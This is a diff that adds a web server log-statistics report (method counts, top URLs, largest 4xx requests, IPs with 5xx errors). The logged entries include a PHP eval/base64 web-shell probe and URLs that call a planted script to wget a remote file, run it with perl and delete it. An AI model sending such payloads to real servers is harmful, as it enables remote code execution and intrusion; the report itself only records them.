@@ -1,0 +1,36 @@
+UNIQUE REQUESTS
+COUNT=4780; 
+
+REQUESTS STATS
+METHOD=POST; COUNT=918; 
+METHOD=GET; COUNT=3730; 
+METHOD=HEAD; COUNT=128; 
+METHOD=PUT; COUNT=3; 
+METHOD=g369g=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2bfCIpOztlY2hvKCJlNTBiNWYyYjRmNjc1NGFmMDljYzg0NWI4YjU4ZTA3NiIpOztlY2hvKCJ8PC0iKTs7ZGllKCk7GET; COUNT=1; 
+
+TOP 10 MOST FREQUENT
+URL=/administrator/index.php; COUNT=99125; 
+URL=/apache-log/access.log; COUNT=22043; 
+URL=/; COUNT=6626; 
+URL=/templates/_system/css/general.css; COUNT=4971; 
+URL=/administrator/index.php; COUNT=4724; 
+URL=/apache-log/access.log; COUNT=3965; 
+URL=/robots.txt; COUNT=2968; 
+URL=/favicon.ico; COUNT=2190; 
+URL=http://almhuette-raith.at/administrator/index.php; COUNT=1556; 
+URL=/wp-login.php; COUNT=1546; 
+
+TOP 5 REQUEST BY BODY BYTES SENT WITH 4XX STATUS CODE
+IP=164.132.159.94; STATUS=404; SIZE=442; URL=/index.php%3Foption%3Dcom_content%26view%3Darticle%26id%3D50%26Itemid%3D56&amp;sa=U&amp;ved=0ahUKEwjLqNrK_8TNAhWTSxoKHYuUCm84rAIQFgi9AzBP&amp;usg=AFQjCNESXAyEBT2Tm9HSkP0-zDYPtMGW1Q/images/com_adsmanager/ads/uploaded/index.inc.php; 
+IP=164.132.159.94; STATUS=404; SIZE=442; URL=/index.php%3Foption%3Dcom_content%26view%3Darticle%26id%3D50%26Itemid%3D56&amp;sa=U&amp;ved=0ahUKEwjLqNrK_8TNAhWTSxoKHYuUCm84rAIQFgi9AzBP&amp;usg=AFQjCNESXAyEBT2Tm9HSkP0-zDYPtMGW1Q/images/com_adsmanager/ads/uploaded/index.inc.php?shxxx=wget%20http://www.fia.com.gr/wp-content/uploads/2010/doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20rm%20-rf%20doc.*; 
+IP=164.132.159.94; STATUS=404; SIZE=442; URL=/index.php%3Foption%3Dcom_content%26view%3Darticle%26id%3D50%26Itemid%3D56&amp;sa=U&amp;ved=0ahUKEwi42O_M_8TNAhWFXhoKHYc8DE043gIQFgi1ATAd&amp;usg=AFQjCNESXAyEBT2Tm9HSkP0-zDYPtMGW1Q/images/com_adsmanager/ads/uploaded/index.inc.php; 
+IP=164.132.159.94; STATUS=404; SIZE=442; URL=/index.php%3Foption%3Dcom_content%26view%3Darticle%26id%3D50%26Itemid%3D56&amp;sa=U&amp;ved=0ahUKEwi42O_M_8TNAhWFXhoKHYc8DE043gIQFgi1ATAd&amp;usg=AFQjCNESXAyEBT2Tm9HSkP0-zDYPtMGW1Q/images/com_adsmanager/ads/uploaded/index.inc.php?shxxx=wget%20http://www.fia.com.gr/wp-content/uploads/2010/doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20rm%20-rf%20doc.*; 
+IP=164.132.159.94; STATUS=404; SIZE=437; URL=/index.php%3Foption%3Dcom_content%26view%3Darticle%26id%3D50%26Itemid%3D56&amp;sa=U&amp;ved=0ahUKEwjLqNrK_8TNAhWTSxoKHYuUCm84rAIQFgi9AzBP&amp;usg=AFQjCNESXAyEBT2Tm9HSkP0-zDYPtMGW1Q/images/com_adsmanager/ads/uploaded/petx.php; 
+
+TOP 5 USERS BY REQUESTS COUNT WITH 5XX STATUS CODE
+IP=189.217.45.73; COUNT=225; 
+IP=82.193.127.15; COUNT=4; 
+IP=91.210.145.36; COUNT=3; 
+IP=194.87.237.6; COUNT=2; 
+IP=198.38.94.207; COUNT=2; 
+
